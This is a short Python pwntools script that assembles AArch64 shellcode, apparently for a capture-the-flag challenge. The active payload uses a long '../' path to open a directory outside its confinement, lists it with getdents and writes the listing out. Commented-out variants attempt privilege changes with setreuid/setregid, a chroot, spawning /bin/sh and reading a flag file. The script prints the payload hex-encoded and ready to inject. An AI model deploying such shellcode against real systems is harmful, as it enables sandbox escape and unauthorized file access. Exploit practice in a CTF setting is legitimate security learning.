from pwn import *
import sys

context.arch = "aarch64"
context.bits = 64

shellcode = """
start:
    mov x4, sp    /* store sp */
    sub sp, sp, #4096

code:
"""

# shellcode += shellcraft.pushstr("programs", "x14")
# shellcode += "    str x14, [sp, #0]!\n"

# shellcode += shellcraft.syscall(0x91, 1, 1) # syscall: setreuid
# shellcode += shellcraft.syscall(0x92, 1) # syscall: setregid


# shellcode += shellcraft.mov("x13", 0)
# shellcode += "loop:\n"
# shellcode += "  add x13, x13, #1\n"
# shellcode += shellcraft.echo("chdir\n", 0x4)              # open dir
# shellcode += "  cmp x13, #1000\n"
# shellcode += "  b.lt loop\n"

# shellcode += shellcraft.pushstr(".", "x14")
# shellcode += "    str x14, [sp, #0]!\n"
# shellcode += shellcraft.syscall(0x33, "sp") # syscall: chroot(".")

shellcode += shellcraft.open("../../../../../../../../../../../")              # open dir
shellcode += shellcraft.syscall(0x3d, "x0", "sp", 0xFF)     # syscall: getdents(x12, sp, 0x1000)
shellcode += shellcraft.write(0x4, "sp", 0xFF)               # send to stdout



# # shellcode += shellcraft.execve("/bin/bash", ["ls", "/", ">", "/domain/interface/firmware/d.txt"])
# shellcode += shellcraft.echo("Heisann\n", 0x4)              # open dir
# shellcode += shellcraft.execve("/bin/sh", ["sh", "-c", "echo Hello string $WORLD > /domain/interface/firmware/d.txt"], {"WORLD": "World!"})
# shellcode += shellcraft.mov("x6", "x0")
# shellcode += shellcraft.write(4, "x6",0xFF)
# shellcode += shellcraft.echo("\n", 0x4)              # open dir

# shellcode += shellcraft.cat("/FLAG.30b1e2298b0e4e6b192de61142476f9e", 0x4)              # open dir



shellcode += """
return:
    mov sp, x4    /* restore sp */
    movz  w0, #0  /* set w0 to 0, guess this is where ret fetches the code */
    ret           /* return */
"""

print(shellcode)
print(asm(shellcode).hex())
